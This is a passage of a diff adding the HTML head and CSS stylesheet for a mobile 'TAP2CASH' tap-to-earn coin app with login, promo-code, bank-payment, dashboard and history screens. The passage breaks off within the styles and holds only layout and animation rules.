@@ -1,0 +1,4018 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>TAP2CASH</title>
+
+<style>
+
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-tap-highlight-color:transparent}
+
+body{background:#0a0a0a;color:#fff;min-height:100vh;min-height:100dvh;display:flex;justify-content:center;align-items:center;overflow:hidden}
+
+.app-container{width:100%;max-width:400px;height:100vh;height:100dvh;max-height:100vh;max-height:100dvh;background:#111;position:relative;overflow:hidden;display:flex;flex-direction:column}
+
+.auth-screen{position:absolute;top:0;left:0;width:100%;height:100%;background:#111;display:flex;flex-direction:column;transition:transform .45s cubic-bezier(.32,.72,0,1);z-index:10;overflow-y:auto}
+
+.auth-screen.hidden-right{transform:translateX(100%);z-index:5}
+
+.auth-screen.hidden-left{transform:translateX(-100%);z-index:5}
+
+.auth-header{display:flex;align-items:center;justify-content:center;padding:15px 20px 5px;position:relative;flex-shrink:0}
+
+.back-btn{position:absolute;left:15px;background:none;border:none;color:#fff;font-size:24px;cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:background .2s}
+
+.back-btn:hover{background:rgba(255,255,255,.1)}
+
+.auth-header-title{font-size:18px;font-weight:600;letter-spacing:1px;text-transform:uppercase}
+
+.auth-content{flex:1;display:flex;flex-direction:column;align-items:center;padding:10px 25px 20px}
+
+.logo-container{position:relative;width:100px;height:100px;margin-bottom:12px;display:flex;justify-content:center;align-items:center;flex-shrink:0}
+
+.coin-outer{position:absolute;width:100px;height:100px;border-radius:50%;background:radial-gradient(circle at 30% 30%,#ffd700 0%,#daa520 50%,#b8860b 100%);box-shadow:0 0 30px rgba(255,215,0,.3),0 0 60px rgba(255,215,0,.15),inset 0 -6px 15px rgba(0,0,0,.4),inset 0 3px 10px rgba(255,255,255,.3);animation:float 3s ease-in-out infinite;display:flex;justify-content:center;align-items:center}
+
+.coin-inner{width:70px;height:70px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#ffec8b 0%,#ffd700 40%,#daa520 100%);display:flex;justify-content:center;align-items:center;box-shadow:inset 0 -3px 10px rgba(139,105,20,.5),inset 0 2px 8px rgba(255,255,255,.4);border:2px solid rgba(255,215,0,.5)}
+
+.naira-symbol{font-size:40px;font-weight:900;color:#8b6914;text-shadow:0 1px 2px rgba(255,255,255,.4),0 -1px 2px rgba(0,0,0,.2)}
+
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+
+.brand-name{font-size:28px;font-weight:900;letter-spacing:3px;margin-bottom:8px;background:linear-gradient(180deg,#fff 0%,#d0d0d0 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;flex-shrink:0}
+
+.subtitle{color:#777;font-size:15px;margin-bottom:25px;font-weight:400;letter-spacing:.5px;flex-shrink:0}
+
+.form-group{width:100%;margin-bottom:12px;position:relative;flex-shrink:0}
+
+.input-wrapper{background:#1a1a1a;border:1.5px solid #2a2a2a;border-radius:14px;padding:12px 14px;transition:all .3s ease;position:relative}
+
+.input-wrapper:focus-within{border-color:#4a9eff;box-shadow:0 0 0 4px rgba(74,158,255,.08);background:#1e1e1e}
+
+.input-label{display:block;color:#999;font-size:11px;margin-bottom:4px;font-weight:500;letter-spacing:.3px}
+
+.input-field{width:100%;background:transparent;border:none;color:#fff;font-size:15px;outline:none;padding:2px 0;font-weight:400}
+
+.input-field::placeholder{color:#555}
+
+.phone-input-wrapper{display:flex;align-items:center;gap:10px}
+
+.country-code{color:#aaa;font-size:15px;font-weight:600;border-right:1.5px solid #333;padding-right:10px;white-space:nowrap}
+
+.password-toggle{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:#666;cursor:pointer;font-size:18px;padding:5px;transition:color .2s}
+
+.password-toggle:hover{color:#999}
+
+.auth-btn{width:100%;padding:15px;border:none;border-radius:14px;font-size:14px;font-weight:700;letter-spacing:1.5px;cursor:pointer;transition:all .3s ease;text-transform:uppercase;position:relative;overflow:hidden;margin-top:4px;flex-shrink:0}
+
+.auth-btn:active{transform:scale(.97)}
+
+.btn-green{background:linear-gradient(135deg,#2e7d32 0%,#1b5e20 100%);color:#fff;box-shadow:0 4px 20px rgba(46,125,50,.25);margin-bottom:10px}
+
+.btn-green:hover{background:linear-gradient(135deg,#388e3c 0%,#2e7d32 100%);box-shadow:0 6px 25px rgba(46,125,50,.35);transform:translateY(-1px)}
+
+.btn-blue{background:linear-gradient(135deg,#1976d2 0%,#0d47a1 100%);color:#fff;box-shadow:0 4px 20px rgba(25,118,210,.25)}
+
+.btn-blue:hover{background:linear-gradient(135deg,#1e88e5 0%,#1976d2 100%);box-shadow:0 6px 25px rgba(25,118,210,.35);transform:translateY(-1px)}
+
+.divider{color:#444;font-size:13px;margin:14px 0;position:relative;width:100%;text-align:center;font-weight:500;flex-shrink:0}
+
+.divider::before,.divider::after{content:'';position:absolute;top:50%;width:42%;height:1px;background:#222}
+
+.divider::before{left:0}.divider::after{right:0}
+
+.forgot-link{color:#666;text-decoration:none;font-size:14px;margin-top:20px;transition:color .2s;font-weight:500;flex-shrink:0}
+
+.forgot-link:hover{color:#4a9eff}
+
+.footer-text{text-align:center;color:#555;font-size:12px;margin-top:auto;padding:15px 10px 5px;line-height:1.7;flex-shrink:0}
+
+.footer-text a{color:#4a9eff;text-decoration:none;font-weight:500}
+
+.message{width:100%;padding:12px 14px;border-radius:12px;margin-bottom:14px;font-size:13px;display:none;animation:slideDown .35s ease;font-weight:500;line-height:1.4;flex-shrink:0}
+
+.message.error{background:rgba(211,47,47,.12);color:#ff5252;border:1px solid rgba(211,47,47,.2);display:block}
+
+.message.success{background:rgba(46,125,50,.12);color:#69f0ae;border:1px solid rgba(46,125,50,.2);display:block}
+
+@keyframes slideDown{from{opacity:0;transform:translateY(-12px)}to{opacity:1;transform:translateY(0)}}
+
+.spinner{display:inline-block;width:16px;height:16px;border:2.5px solid rgba(255,255,255,.25);border-radius:50%;border-top-color:#fff;animation:spin .8s linear infinite;margin-left:8px;vertical-align:middle}
+
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.safe-area-bottom{height:env(safe-area-inset-bottom,15px);min-height:15px;flex-shrink:0}
+
+
+
+/* PROMO SCREEN - fixed layout, no scroll needed */
+
+.promo-screen{position:absolute;top:0;left:0;width:100%;height:100%;background:#111;display:none;flex-direction:column;z-index:20;overflow:hidden}
+
+.promo-screen.active{display:flex}
+
+.promo-header{padding:12px 20px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
+
+.promo-header .menu-btn{background:none;border:none;color:#fff;font-size:22px;cursor:pointer}
+
+.promo-header .header-title{font-size:16px;font-weight:600;letter-spacing:1px}
+
+/* Top section: coin + brand + buy button */
+
+.promo-top{display:flex;flex-direction:column;align-items:center;padding:0 20px 8px;flex-shrink:0}
+
+.buy-promo-btn{width:100%;padding:13px;border:none;border-radius:14px;font-size:14px;font-weight:700;letter-spacing:1px;cursor:pointer;transition:all .3s ease;text-transform:uppercase;margin-bottom:10px;flex-shrink:0;background:linear-gradient(180deg,#e53935 0%,#c62828 50%,#b71c1c 100%);color:#fff;box-shadow:0 4px 15px rgba(198,40,40,.4),inset 0 1px 0 rgba(255,255,255,.2);position:relative;overflow:hidden}
+
+.buy-promo-btn::before{content:'';position:absolute;top:5px;left:10px;right:10px;height:35%;background:linear-gradient(180deg,rgba(255,255,255,.15) 0%,rgba(255,255,255,.05) 100%);border-radius:6px;pointer-events:none}
+
+.buy-promo-btn:active{transform:scale(.98)}
+
+.promo-coin-container{position:relative;width:75px;height:75px;margin-bottom:6px;display:flex;justify-content:center;align-items:center;flex-shrink:0}
+
+.promo-coin-outer{position:absolute;width:75px;height:75px;border-radius:50%;background:radial-gradient(circle at 30% 30%,#ffd700 0%,#daa520 50%,#b8860b 100%);box-shadow:0 0 30px rgba(255,215,0,.35),inset 0 -5px 12px rgba(0,0,0,.4),inset 0 3px 8px rgba(255,255,255,.3);animation:glowFloat 3s ease-in-out infinite;display:flex;justify-content:center;align-items:center}
+
+.promo-coin-inner{width:52px;height:52px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#ffec8b 0%,#ffd700 40%,#daa520 100%);display:flex;justify-content:center;align-items:center;box-shadow:inset 0 -3px 8px rgba(139,105,20,.5),inset 0 2px 6px rgba(255,255,255,.4);border:2px solid rgba(255,215,0,.5)}
+
+.promo-naira{font-size:28px;font-weight:900;color:#8b6914}
+
+@keyframes glowFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+
+.promo-brand{font-size:22px;font-weight:900;letter-spacing:3px;margin-bottom:2px;background:linear-gradient(180deg,#fff 0%,#d0d0d0 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;flex-shrink:0}
+
+.promo-tagline{color:#888;font-size:12px;margin-bottom:0;font-style:italic;flex-shrink:0}
+
+/* Middle: code display box */
+
+.promo-code-box{width:calc(100% - 40px);background:#1a1a1a;border:2px dashed #444;border-radius:12px;padding:10px 14px;text-align:center;flex-shrink:0;transition:all .3s ease;margin:8px 20px}
+
+.promo-code-box.has-code{border-color:#ffd700;background:linear-gradient(180deg,#1a1a1a 0%,#1e1e0a 100%);box-shadow:0 0 20px rgba(255,215,0,.1)}
+
+.promo-code-label{color:#888;font-size:12px;margin-bottom:4px;letter-spacing:.5px}
+
+.promo-code-value{font-size:26px;font-weight:800;color:#ffd700;letter-spacing:8px;font-family:'Courier New',monospace;text-shadow:0 0 10px rgba(255,215,0,.3)}
+
+.promo-code-placeholder{color:#555;font-size:14px;font-style:italic}
+
+/* Keypad area */
+
+.keypad-container{width:calc(100% - 40px);background:#1a1a1a;border-radius:16px;padding:12px 10px;flex-shrink:0;box-shadow:inset 0 2px 10px rgba(0,0,0,.3);margin:0 20px}
+
+.keypad-row{display:flex;justify-content:space-around;margin-bottom:8px}
+
+.keypad-row:last-child{margin-bottom:0}
+
+.keypad-btn{width:58px;height:58px;border-radius:50%;border:none;background:linear-gradient(180deg,#2a2a2a 0%,#1e1e1e 100%);color:#fff;font-size:22px;font-weight:700;cursor:pointer;transition:all .15s ease;box-shadow:0 4px 8px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.08);display:flex;align-items:center;justify-content:center}
+
+.keypad-btn:active{transform:scale(.90);box-shadow:0 2px 4px rgba(0,0,0,.4),inset 0 2px 4px rgba(0,0,0,.2)}
+
+/* Bottom action row - always visible */
+
+.promo-actions{display:flex;gap:10px;padding:10px 20px calc(10px + env(safe-area-inset-bottom,0px));flex-shrink:0;background:#111}
+
+.clear-btn{flex:1;padding:15px 0;border:none;border-radius:14px;font-size:14px;font-weight:700;letter-spacing:1px;cursor:pointer;transition:all .3s ease;text-transform:uppercase;background:linear-gradient(180deg,#ff6f00 0%,#e65100 50%,#bf360c 100%);color:#fff;box-shadow:0 4px 15px rgba(230,81,0,.3),inset 0 1px 0 rgba(255,255,255,.2)}
+
+.clear-btn:active{transform:scale(.97)}
+
+.promo-login-btn{flex:2;padding:15px 0;border:none;border-radius:14px;font-size:14px;font-weight:700;letter-spacing:1px;cursor:pointer;transition:all .3s ease;text-transform:uppercase;background:linear-gradient(180deg,#43a047 0%,#2e7d32 50%,#1b5e20 100%);color:#fff;box-shadow:0 4px 15px rgba(46,125,50,.3),inset 0 1px 0 rgba(255,255,255,.2);position:relative;overflow:hidden}
+
+.promo-login-btn:active{transform:scale(.97)}
+
+.promo-login-btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
+
+
+
+.buy-screen{position:absolute;top:0;left:0;width:100%;height:100%;background:#111;display:none;flex-direction:column;z-index:30;overflow-y:auto}
+
+.buy-screen.active{display:flex}
+
+.buy-header{display:flex;align-items:center;justify-content:center;padding:15px 20px 5px;position:relative;flex-shrink:0}
+
+.buy-content{flex:1;display:flex;flex-direction:column;align-items:center;padding:10px 20px 20px}
+
+.buy-coin-container{position:relative;width:80px;height:80px;margin-bottom:10px;display:flex;justify-content:center;align-items:center;flex-shrink:0}
+
+.buy-coin-outer{position:absolute;width:80px;height:80px;border-radius:50%;background:radial-gradient(circle at 30% 30%,#ffd700 0%,#daa520 50%,#b8860b 100%);box-shadow:0 0 30px rgba(255,215,0,.3),inset 0 -4px 10px rgba(0,0,0,.4),inset 0 2px 8px rgba(255,255,255,.3);display:flex;justify-content:center;align-items:center}
+
+.buy-coin-inner{width:55px;height:55px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#ffec8b 0%,#ffd700 40%,#daa520 100%);display:flex;justify-content:center;align-items:center;box-shadow:inset 0 -2px 8px rgba(139,105,20,.5),inset 0 2px 6px rgba(255,255,255,.4);border:1.5px solid rgba(255,215,0,.5)}
+
+.buy-naira{font-size:30px;font-weight:900;color:#8b6914;text-shadow:0 1px 2px rgba(255,255,255,.4)}
+
+.buy-brand{font-size:22px;font-weight:900;letter-spacing:2px;margin-bottom:20px;background:linear-gradient(180deg,#fff 0%,#d0d0d0 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;flex-shrink:0}
+
+.price-card{width:100%;background:linear-gradient(180deg,#1a1a1a 0%,#141414 100%);border:2px solid #ffd700;border-radius:16px;padding:20px;text-align:center;margin-bottom:15px;flex-shrink:0;box-shadow:0 0 30px rgba(255,215,0,.1)}
+
+.price-label{color:#aaa;font-size:14px;margin-bottom:8px;letter-spacing:.5px}
+
+.price-value{font-size:36px;font-weight:800;color:#ffd700;text-shadow:0 0 15px rgba(255,215,0,.3);letter-spacing:1px}
+
+.price-value span{font-size:28px;font-weight:700}
+
+.bank-card{width:100%;background:linear-gradient(180deg,#1a1a1a 0%,#141414 100%);border:1.5px solid #2a3a4a;border-radius:16px;padding:20px;margin-bottom:20px;flex-shrink:0;box-shadow:0 4px 20px rgba(0,0,0,.3)}
+
+.bank-card-title{text-align:center;font-size:15px;font-weight:700;color:#fff;margin-bottom:15px;letter-spacing:1px;text-transform:uppercase}
+
+.bank-divider{height:2px;background:linear-gradient(90deg,transparent,#3a5a7a,transparent);margin-bottom:15px}
+
+.bank-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+
+.bank-row:last-child{margin-bottom:0}
+
+.bank-label{color:#888;font-size:13px}
+
+.bank-value{color:#fff;font-size:14px;font-weight:600}
+
+.bank-value.acct-num{color:#ffd700;font-weight:700;letter-spacing:1px;cursor:pointer;transition:all .2s;user-select:all}
+
+.bank-value.acct-num:hover{text-shadow:0 0 10px rgba(255,215,0,.4)}
+
+.bank-note{text-align:center;color:#777;font-size:12px;line-height:1.6;margin-top:15px;padding-top:15px;border-top:1px solid #222}
+
+.bank-note .highlight{color:#00e676;font-weight:600}
+
+.copy-btn{background:none;border:1px solid #444;color:#888;padding:4px 10px;border-radius:6px;font-size:11px;cursor:pointer;margin-left:8px;transition:all .2s}
+
+.copy-btn:hover{border-color:#ffd700;color:#ffd700}
+
+.copy-btn.copied{border-color:#00e676;color:#00e676}
+
+.buy-action-btn{width:100%;padding:18px;border:none;border-radius:16px;font-size:16px;font-weight:700;letter-spacing:1.5px;cursor:pointer;transition:all .3s ease;text-transform:uppercase;margin-bottom:20px;flex-shrink:0;background:linear-gradient(180deg,#e53935 0%,#c62828 50%,#b71c1c 100%);color:#fff;box-shadow:0 4px 15px rgba(198,40,40,.4),0 8px 30px rgba(198,40,40,.2),inset 0 1px 0 rgba(255,255,255,.2),inset 0 -2px 0 rgba(0,0,0,.2);position:relative;overflow:hidden}
+
+.buy-action-btn::before{content:'';position:absolute;top:6px;left:10px;right:10px;height:40%;background:linear-gradient(180deg,rgba(255,255,255,.15) 0%,rgba(255,255,255,.05) 100%);border-radius:8px;pointer-events:none}
+
+.buy-action-btn:hover{background:linear-gradient(180deg,#ef5350 0%,#d32f2f 50%,#c62828 100%);box-shadow:0 6px 20px rgba(198,40,40,.5),0 10px 40px rgba(198,40,40,.3),inset 0 1px 0 rgba(255,255,255,.2),inset 0 -2px 0 rgba(0,0,0,.2);transform:translateY(-2px)}
+
+.buy-action-btn:active{transform:scale(.98) translateY(0)}
+
+.buy-footer-note{text-align:center;color:#555;font-size:12px;line-height:1.5;flex-shrink:0}
+
+
+
+.failed-screen{position:absolute;top:0;left:0;width:100%;height:100%;background:#111;display:none;flex-direction:column;z-index:40;overflow-y:auto}
+
+.failed-screen.active{display:flex}
+
+.failed-header{display:flex;align-items:center;justify-content:center;padding:15px 20px 5px;position:relative;flex-shrink:0}
+
+.failed-content{flex:1;display:flex;flex-direction:column;align-items:center;padding:30px 25px 20px}
+
+.failed-icon-container{width:120px;height:120px;border-radius:50%;background:linear-gradient(180deg,#3e2723 0%,#2d1b18 100%);border:4px solid #ff5722;display:flex;align-items:center;justify-content:center;margin-bottom:25px;box-shadow:0 0 30px rgba(255,87,34,.2),0 0 60px rgba(255,87,34,.1),inset 0 2px 10px rgba(255,255,255,.05);animation:failedPulse 2s ease-in-out infinite}
+
+.failed-x{font-size:56px;font-weight:900;color:#ff5722;text-shadow:0 0 20px rgba(255,87,34,.4)}
+
+@keyframes failedPulse{0%,100%{transform:scale(1);box-shadow:0 0 30px rgba(255,87,34,.2),0 0 60px rgba(255,87,34,.1),inset 0 2px 10px rgba(255,255,255,.05)}50%{transform:scale(1.03);box-shadow:0 0 40px rgba(255,87,34,.3),0 0 80px rgba(255,87,34,.15),inset 0 2px 10px rgba(255,255,255,.05)}}
+
+.failed-title{font-size:28px;font-weight:800;color:#ff5722;margin-bottom:20px;text-shadow:0 0 15px rgba(255,87,34,.2);letter-spacing:1px}
+
+.status-box{width:100%;background:linear-gradient(180deg,#1a1a1a 0%,#141414 100%);border:2px solid #ff5722;border-radius:16px;padding:25px 20px;text-align:center;margin-bottom:20px;box-shadow:0 0 25px rgba(255,87,34,.1)}
+
+.status-box-title{font-size:16px;font-weight:700;color:#fff;margin-bottom:12px;letter-spacing:1px;text-transform:uppercase}
+
+.status-box-divider{height:3px;background:linear-gradient(90deg,transparent,#ff5722,transparent);margin-bottom:18px}
+
+.status-box-message{color:#fff;font-size:16px;line-height:1.6;margin-bottom:15px}
+
+.status-box-sub{color:#888;font-size:14px;line-height:1.6;padding-top:15px;border-top:1px solid #333}
+
+.status-box-sub .contact-link{color:#4a9eff;text-decoration:none;font-weight:600;transition:color .2s}
+
+.status-box-sub .contact-link:hover{color:#82b1ff;text-decoration:underline}
+
+.failed-footer{color:#444;font-size:13px;margin-top:auto;padding-top:20px;text-align:center}
+
+.retry-btn{width:100%;padding:16px;border:2px solid #ff5722;border-radius:14px;font-size:15px;font-weight:700;letter-spacing:1.5px;cursor:pointer;transition:all .3s ease;text-transform:uppercase;margin-top:20px;background:transparent;color:#ff5722}
+
+.retry-btn:hover{background:rgba(255,87,34,.1);border-color:#ff7043;color:#ff7043;transform:translateY(-1px)}
+
+.retry-btn:active{transform:scale(.98)}
+
+.back-home-btn{width:100%;padding:16px;border:none;border-radius:14px;font-size:15px;font-weight:700;letter-spacing:1.5px;cursor:pointer;transition:all .3s ease;text-transform:uppercase;margin-top:10px;background:linear-gradient(180deg,#424242 0%,#212121 100%);color:#aaa;box-shadow:0 4px 15px rgba(0,0,0,.3)}
+
+.back-home-btn:hover{background:linear-gradient(180deg,#616161 0%,#424242 100%);color:#fff}
+
+
+
+.dashboard-screen{position:absolute;top:0;left:0;width:100%;height:100%;background:#0f1629;display:none;flex-direction:column;z-index:25;overflow:hidden}
+
+.dashboard-screen.active{display:flex}
+
+.dash-header{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:#1a237e;flex-shrink:0}
+
+.dash-header .back-arrow{background:none;border:none;color:#fff;font-size:22px;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center}
+
+.dash-header .dash-title{font-size:18px;font-weight:700;letter-spacing:2px;color:#fff}
+
+.dash-header .star-btn{background:none;border:none;color:#fff;font-size:20px;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center}
+
+.dash-content{flex:1;display:flex;flex-direction:column;align-items:center;padding:10px 20px 8px;overflow-y:auto}
+
+.stats-row{display:flex;gap:10px;width:100%;margin-bottom:8px}
+
+.stat-card{flex:1;background:#1a237e;border-radius:12px;padding:10px 12px;display:flex;align-items:center;gap:8px;border:2px solid transparent}
+
+.stat-card.coins-card{border-color:#ffd700}
+
+.stat-card.naira-card{border-color:#00e676}
+
+.stat-icon{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:900;flex-shrink:0}
+
+.stat-icon.gold{background:#ffd700;color:#8b6914}
+
+.stat-icon.green{background:#00e676;color:#004d40}
+
+.stat-info{display:flex;flex-direction:column}
+
+.stat-label{color:#aaa;font-size:11px;font-weight:500}
+
+.stat-value{color:#ffd700;font-size:18px;font-weight:800}
+
+.stat-value.naira-val{color:#00e676}
+
+.rate-bar{width:100%;background:#1a237e;border-radius:10px;padding:7px 15px;text-align:center;margin-bottom:8px;border:1px solid #283593}
+
+.rate-text{color:#ffd700;font-size:13px;font-weight:600}
+
+.tap-instruction{color:#888;font-size:13px;margin-bottom:8px;text-align:center}
+
+.tap-coin-area{position:relative;width:150px;height:150px;display:flex;justify-content:center;align-items:center;margin-bottom:10px;cursor:pointer;user-select:none;-webkit-user-select:none}
+
+.tap-coin-area:active .tap-coin-outer{transform:scale(.88)}
+
+
+
+/* Outer glow pulse rings */
+
+.tap-ring{position:absolute;border-radius:50%;border:1.5px dashed rgba(255,215,0,.25);animation:ringSpin 10s linear infinite}
+
+.tap-ring:nth-child(1){width:100%;height:100%;animation-duration:10s}
+
+.tap-ring:nth-child(2){width:125%;height:125%;border-color:rgba(255,215,0,.12);animation-duration:15s;animation-direction:reverse}
+
+.tap-ring:nth-child(3){width:150%;height:150%;border-color:rgba(255,215,0,.06);animation-duration:20s}
+
+@keyframes ringSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+
+
+
+/* Glow pulse behind coin */
+
+.tap-coin-area::before{
+
+    content:'';
+
+    position:absolute;
+
+    width:110px;height:110px;
+
+    border-radius:50%;
+
+    background:radial-gradient(circle,rgba(255,215,0,.35) 0%,rgba(255,180,0,.15) 50%,transparent 75%);
+
+    animation:coinPulse 2s ease-in-out infinite;
+
+    z-index:1;
+
+}
+
+@keyframes coinPulse{
+
+    0%,100%{transform:scale(1);opacity:.7}
+
+    50%{transform:scale(1.25);opacity:1}
+
+}
+
+
+
+/* Coin body */
+
+.tap-coin-outer{
+
+    position:relative;
+
+    width:112px;height:112px;
+
+    border-radius:50%;
+
+    background:
+
+        /* Top shine streak */
+
+        radial-gradient(ellipse at 38% 22%,rgba(255,255,220,.7) 0%,transparent 45%),
+
+        /* Main gold gradient */
+
+        conic-gradient(from 120deg,#b8860b,#ffd700,#ffe566,#ffd700,#daa520,#b8860b,#ffd700,#ffe566,#ffd700,#b8860b);
+
+    box-shadow:
+
+        0 0 0 3px #b8860b,
+
+        0 0 0 5px rgba(255,215,0,.3),
+
+        0 0 25px rgba(255,215,0,.5),
+
+        0 0 50px rgba(255,215,0,.25),
+
+        0 0 80px rgba(255,200,0,.15),
+
+        inset 0 -6px 14px rgba(0,0,0,.45),
+
+        inset 0 4px 10px rgba(255,255,200,.35);
+
+    display:flex;justify-content:center;align-items:center;
+
+    transition:transform .12s ease;
+
+    z-index:2;
+
+    animation:coinFloat 3s ease-in-out infinite;
+
+}
+
+@keyframes coinFloat{
+
+    0%,100%{transform:translateY(0)}
+
+    50%{transform:translateY(-5px)}
+
+}
+
+
+
+/* Coin edge ridges (via border) */
+
+.tap-coin-outer::before{
+
+    content:'';
+
+    position:absolute;
+
+    inset:4px;
+
+    border-radius:50%;
+
+    border:2px solid rgba(255,240,100,.25);
+
+    background:transparent;
+
+    pointer-events:none;
+
+    z-index:3;
+
+}
+
+
+
+/* Inner coin face */
+
+.tap-coin-inner{
+
+    position:relative;
+
+    width:80px;height:80px;
+
+    border-radius:50%;
+
+    background:
+
+        radial-gradient(ellipse at 35% 28%,rgba(255,255,200,.5) 0%,transparent 50%),
+
+        radial-gradient(circle at 60% 70%,rgba(0,0,0,.2) 0%,transparent 50%),
+
+        radial-gradient(circle at 50% 50%,#ffe87c 0%,#ffd700 40%,#c8960c 100%);
+
+    box-shadow:
+
+        inset 0 -4px 12px rgba(100,70,0,.6),
+
+        inset 0 3px 10px rgba(255,255,200,.5),
+
+        inset 0 0 0 2px rgba(255,220,50,.3);
+
+    display:flex;justify-content:center;align-items:center;
+
+    z-index:4;
+
+}
+
+
+
+/* Shine streak on inner face */
+
+.tap-coin-inner::before{
+
+    content:'';
+
+    position:absolute;
+
+    width:28px;height:10px;
+
+    background:rgba(255,255,255,.45);
+
+    border-radius:50%;
+
+    top:16px;left:14px;
+
+    transform:rotate(-30deg);
+
+    filter:blur(3px);
+
+    pointer-events:none;
+
+}
+
+
+
+.tap-naira{font-size:38px;font-weight:900;color:#7a5800;text-shadow:0 2px 3px rgba(255,255,200,.5),0 -1px 2px rgba(0,0,0,.3);z-index:5;position:relative}
+
+.tap-particle{position:absolute;color:#ffd700;font-size:14px;font-weight:700;pointer-events:none;animation:particleFloat .8s ease-out forwards;z-index:10}
+
+@keyframes particleFloat{0%{opacity:1;transform:translateY(0) scale(1)}100%{opacity:0;transform:translateY(-60px) scale(.5)}}
+
+.balance-card{width:100%;background:#1a237e;border-radius:14px;padding:12px 16px;text-align:center;margin-bottom:8px;border:1px solid #283593}
+
+.balance-title{color:#fff;font-size:13px;font-weight:700;margin-bottom:6px;letter-spacing:1px}
+
+.balance-divider{height:2px;background:linear-gradient(90deg,transparent,#ffd700,transparent);margin-bottom:8px}
+
+.balance-amount{font-size:32px;font-weight:900;color:#ffd700;text-shadow:0 0 15px rgba(255,215,0,.3);margin-bottom:4px}
+
+.balance-rate{color:#888;font-size:12px;margin-bottom:2px}
+
+.balance-rate span{color:#ffd700;font-weight:700}
+
+.dash-bottom-nav{display:flex;justify-content:space-around;align-items:center;background:#1a237e;padding:10px 0 calc(10px + env(safe-area-inset-bottom,10px));flex-shrink:0;border-top:1px solid #283593;position:relative;z-index:10}
+
+.nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer;padding:5px 15px;transition:all .2s;border:none;background:none;color:inherit}
+
+.nav-item:hover{opacity:.8}
+
+.nav-item.active .nav-icon{background:#ffd700;color:#8b6914}
+
+.nav-item.active .nav-label{color:#ffd700;font-weight:700}
+
+.nav-icon{width:36px;height:36px;border-radius:50%;background:#283593;color:#aaa;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;transition:all .2s}
+
+.nav-label{color:#aaa;font-size:11px;font-weight:500;transition:all .2s}
+
+
+
+.loading-overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(17,17,17,.95);display:none;flex-direction:column;align-items:center;justify-content:center;z-index:50}
+
+.loading-overlay.active{display:flex}
+
+.loading-spinner{width:50px;height:50px;border:4px solid rgba(255,215,0,.2);border-radius:50%;border-top-color:#ffd700;animation:spin 1s linear infinite;margin-bottom:20px}
+
+.loading-text{color:#aaa;font-size:16px;font-weight:500;letter-spacing:1px}
+
+.toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%) translateY(100px);background:#1a1a1a;color:#fff;padding:12px 24px;border-radius:10px;font-size:14px;font-weight:500;box-shadow:0 4px 20px rgba(0,0,0,.5);border:1px solid #333;z-index:1000;opacity:0;transition:all .3s ease;pointer-events:none}
+
+.toast.show{transform:translateX(-50%) translateY(0);opacity:1}
+
+.toast.success{border-color:#2e7d32;color:#69f0ae}
+
+.modal-overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);display:none;align-items:center;justify-content:center;z-index:60;padding:20px}
+
+.modal-overlay.active{display:flex}
+
+.modal-box{background:#1a237e;border-radius:16px;padding:25px;width:100%;max-width:320px;text-align:center;border:1px solid #283593}
+
+.modal-title{font-size:18px;font-weight:700;margin-bottom:15px;color:#ffd700}
+
+.modal-text{color:#aaa;font-size:14px;line-height:1.6;margin-bottom:20px}
+
+.modal-close{width:100%;padding:12px;border:none;border-radius:10px;background:#ffd700;color:#8b6914;font-size:14px;font-weight:700;cursor:pointer}
+
+
+
+        /* ===== HISTORY SCREEN ===== */
+        .history-screen {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #0f1629;
+            display: none;
+            flex-direction: column;
+            z-index: 26;
+            overflow: hidden;
+        }
+        .history-screen.active { display: flex; }
+        .history-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 20px;
+            background: #1a237e;
+            flex-shrink: 0;
+        }
+        .history-header .history-title {
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            color: #fff;
+        }
+        .history-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .history-empty {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #444;
+            font-size: 15px;
+            gap: 10px;
+        }
+        .history-empty-icon { font-size: 48px; }
+        .history-item {
+            background: #1a237e;
+            border-radius: 12px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            border: 1px solid #283593;
+        }
+        .history-item-icon {
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+        .history-item-icon.earn { background: rgba(255,215,0,.15); }
+        .history-item-icon.withdraw { background: rgba(0,230,118,.12); }
+        .history-item-info { flex: 1; }
